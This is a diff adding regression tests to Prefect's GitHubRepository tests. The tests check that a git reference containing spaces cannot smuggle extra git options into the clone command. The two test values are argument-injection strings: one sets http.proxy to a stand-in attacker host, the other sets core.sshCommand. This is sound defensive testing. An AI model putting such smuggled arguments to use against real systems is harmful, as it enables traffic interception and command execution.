@@ -217,6 +217,57 @@ class TestGitHubRepository:
                 assert set(os.listdir(tmp_dst)) == set([sub_dir_name])
                 assert set(os.listdir(Path(tmp_dst) / sub_dir_name)) == child_contents
 
+    async def test_reference_is_not_split_on_whitespace(self, monkeypatch):
+        """A reference containing spaces must be passed as a single argument so
+        that an attacker cannot inject additional git options via the
+        `reference` field (BOUNTY-343).
+        """
+
+        class p:
+            returncode = 0
+
+        mock = AsyncMock(return_value=p())
+        monkeypatch.setattr(prefect_github.repository, "run_process", mock)
+
+        malicious_reference = "main -c http.proxy=http://attacker.example:8080"
+        g = GitHubRepository(
+            repository_url="https://github.com/PrefectHQ/prefect.git",
+            reference=malicious_reference,
+        )
+        await g.get_directory()
+
+        assert mock.await_count == 1
+        cmd = mock.await_args[0][0]
+        assert "-c" not in cmd
+        assert "http.proxy=http://attacker.example:8080" not in cmd
+        assert malicious_reference in cmd
+        assert cmd[cmd.index("-b") + 1] == malicious_reference
+
+    def test_reference_is_not_split_on_whitespace_sync(self, monkeypatch):
+        """Sync counterpart of the argument-injection regression test."""
+        import subprocess
+        from unittest.mock import MagicMock
+
+        mock_result = MagicMock()
+        mock_result.returncode = 0
+        mock_result.stderr = ""
+        run_mock = MagicMock(return_value=mock_result)
+        monkeypatch.setattr(subprocess, "run", run_mock)
+
+        malicious_reference = "main -c core.sshCommand=evil"
+        g = GitHubRepository(
+            repository_url="git@github.com:PrefectHQ/prefect.git",
+            reference=malicious_reference,
+        )
+        g.get_directory()
+
+        assert run_mock.call_count == 1
+        cmd = run_mock.call_args[0][0]
+        assert "-c" not in cmd
+        assert "core.sshCommand=evil" not in cmd
+        assert malicious_reference in cmd
+        assert cmd[cmd.index("-b") + 1] == malicious_reference
+
     async def test_get_directory_preserves_symlinks(self, monkeypatch):
         """Test that get_directory preserves symlinks instead of following them.
 
